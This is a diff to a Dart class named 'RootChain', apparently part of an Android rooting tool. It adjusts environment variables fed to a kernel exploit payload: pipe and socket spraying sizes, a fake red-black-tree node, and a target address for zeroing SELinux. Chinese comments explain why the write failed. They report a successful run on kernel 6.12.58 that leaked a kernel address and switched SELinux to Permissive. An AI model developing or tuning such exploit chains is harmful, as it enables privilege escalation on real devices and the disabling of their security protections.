@@ -1440,7 +1440,15 @@ class RootChain extends ChangeNotifier {
           'P645_NDEL=7 P645_DEL_RUN_MS=2500 P645_CONC=1 P645_ANON_MB=8 P645_FREEZE=1 P645_V8=1 '
           'P645_DRAIN_WAIT_MS=25000 P645_PIPE512=64 P645_SOCKS=64 P645_SOCK_MB=8 P645_UHID=0 '
           'P645_MODE=4 P645_ANON2_MB=1024 P645_PIPE_DRAIN=1 P645_PIPE_K=4 P645_SCAN_STOP=1 '
-          'P645_THRESH=32 P645_RING_GO=0 P645_FORCE_LEFT=${calib.selinuxZeroTargetHex} '
+          'P645_THRESH=32 P645_RING_GO=0 '
+          // P645_LEFT 与 P645_FORCE_LEFT 必须同时给：载荷在构造 fake_node 时读的是
+          // P645_LEFT（g_left），而 g_force_left 只在后续 stage 生效。只给 FORCE_LEFT
+          // 时 fake_node.left 恒为 0，`mode=4` 走 rb_left==0 的 case1 分支 ⇒ 判据通过
+          // 但内核零写入（stderr: `WARN mode4 left==0 -> rb_left=0 (case1, 无写入!)`）。
+          // 在 6.12.58 (BKQ-AN10) 上实测：补上 P645_LEFT 后同一发即落地
+          // （leak=0xffffff89ad031078, getenforce=Permissive）。
+          'P645_LEFT=${calib.selinuxZeroTargetHex} '
+          'P645_FORCE_LEFT=${calib.selinuxZeroTargetHex} '
           // PRE_PIPES 决定 uid 2000 的 64MB 管道预算用得早不早：
           // 20000 会把预算占满 ⇒ 后面 PIPE512=64 的 512KB 管道必然 EPERM（实测 errno=1）。
           'P645_PRE_PIPES=$prePipes P645_LOG=$logPath';
